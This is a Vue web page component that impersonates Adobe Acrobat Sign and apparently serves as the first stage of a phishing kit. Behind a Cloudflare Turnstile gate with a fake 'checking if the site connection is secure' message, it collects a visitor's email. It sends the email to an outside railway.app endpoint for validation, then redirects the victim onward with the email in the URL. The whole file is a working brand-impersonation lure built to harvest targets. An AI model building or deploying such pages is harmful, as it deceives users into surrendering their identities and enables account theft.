<template>
  <div v-if="!captchaToken" class="gate-container">
    <header>
   
    </header>
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div
          class="cf-turnstile"
          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
        ></div>
      </div>
    </main>
    <footer>
      <p></p>
    </footer>
  </div>

  <div v-else class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="success-check">⼈</span>
            <span>Adobe Acrobat Sign</span>
          </div>
        </div>
        <div class="content">
          <p><strong>Please verify your email to continue.</strong></p>
          <div class="form-wrapper">
            <input
              v-model="email"
              type="email"
              placeholder="Email required"
              required
              class="email-input"
              :disabled="loading"
            />
            <p v-if="error" class="error">{{ error }}</p>
            <button
              @mousedown="startHold"
              @mouseup="endHold"
              @mouseleave="cancelHold"
              @touchstart.prevent="startHold"
              @touchend.prevent="endHold"
              :disabled="loading"
              class="action-button"
            >
              {{ loading ? 'Verifying…' : 'Continue' }}
            </button>
          </div>
        </div>
        <div class="divider"></div>
        <div class="footer-container">
          <p class="footer-text">© 2025 All rights reserved. </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)

let holdTimer = null
const holdDuration = 1500
const redirectBaseUrl = 'https://yourdomain.com/complete'

onMounted(async () => {
  await nextTick()
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: (token) => {
        captchaToken.value = token
      }
    })
  }
})

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function verifyEmail() {
  try {
    const res = await fetch(
      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.value,
          captchaToken: captchaToken.value
        }),
      }
    )
    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer = setTimeout(verifyEmail, holdDuration)
}

function endHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}

function cancelHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}
</script>

<style scoped>
html, body {
  height: 100vh;
  margin: 0;
  padding: 0;
  overflow: hidden;
  background-color: #F0F0F0;
  font-family: Arial, sans-serif;
}

body {
  display: block;
}

/* Shared layout for both .background and .gate-container */
.background,
.gate-container {
  position: fixed;
  top: 0;
  left: 0;
  height: 90vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;    /* Align content to top */
  align-items: center;            /* Center horizontally */
  padding-top: 60px;
  box-sizing: border-box;
  overflow: hidden;
}

/* CAPTCHA scaling */
.cf-turnstile {
  transform: scale(0.9);
  transform-origin: top center;
  height: auto !important;
  width: auto !important;
}

/* Email form container */
.adobe-sign-container {
  width: 70%;
  max-width: 400px;
  background: #fff;
  border-radius: 10px;
  box-shadow: 1 1px 10px rgba(0, 0, 0, 0.1);
  padding: 2rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
  height: 70vh;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 1rem;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}

.success-check {
  font-size: 3rem;
  color: red;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  border: 1px solid #D10000;
  border-radius: 5px;
  font-size: 1rem;
}

.action-button {
  background-color: transparent;
  color: black;
  padding: 0.6rem 1.5rem;
  border: 1px solid #D10000;
  border-radius: 13px;
  cursor: pointer;
  margin-top: 1rem;
  font-size: 1rem;
  width: 50%;
  max-width: 380px;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: transparent;
}

.divider {
  height: 0;
  background-color: #e0e0e0;
  margin: 1rem 0;
}

.footer-container {
  text-align: center;
}

.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}
</style>
